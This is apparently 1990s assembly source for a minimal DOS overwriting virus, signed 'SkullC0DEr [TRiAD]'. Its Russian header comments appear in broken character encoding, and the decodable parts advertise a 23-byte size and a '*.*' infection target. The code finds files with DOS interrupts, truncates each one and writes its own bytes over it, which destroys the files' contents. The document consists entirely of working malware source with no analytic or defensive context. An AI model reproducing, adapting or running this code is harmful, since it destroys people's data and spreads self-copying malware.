                   ;       [S]1997 SkullC0DEr [TRiAD]
                   ;
                   ;       ‘ ¬ë© ¬ «¥ìª¨© ®¢¥àà ©â¥à (¬¥ìè¥, imho, ã¦¥ ¥ªã¤  †:)
                   ;       * §¬¥à: 23 ¡ ©â 
                   ;       ˆä¨æ¨à®¢ ¨¥: *.*
                   ;       ‘â ¡¨«ì®áâì: § ¢¨á¨â ®â á®áâ®ï¨ï à¥£¨áâà®¢ ¯à¨ § ¯ãáª¥
                   ;       ’à¥¡®¢ ¨ï ª CPU: 8086
                   ;       ‡ ¬¥ç ¨ï: ¬®¦¥â ¥ ¯®©â¨ ¯®¤ ¥ª®â®àë¬¨ ¢¥àá¨ï¬¨ ¤®á

   CSEG            SEGMENT
           ORG 100H
           ASSUME  CS:CSEG,DS:CSEG,ES:CSEG,SS:CSEG
   START:
                   SUB     CH,BYTE PTR DS:[2AH]
                   MOV     AH,4EH
   ST_1:
                   MOV     DX,SI
                   INT     21H
                   MOV     AH,3CH
                   MOV     DX,9EH
                   INT     21H
                   XCHG    BX,AX
                   MOV     AH,40H
                   JNC     ST_1
                   RETN
   CSEG        ENDS
           END START
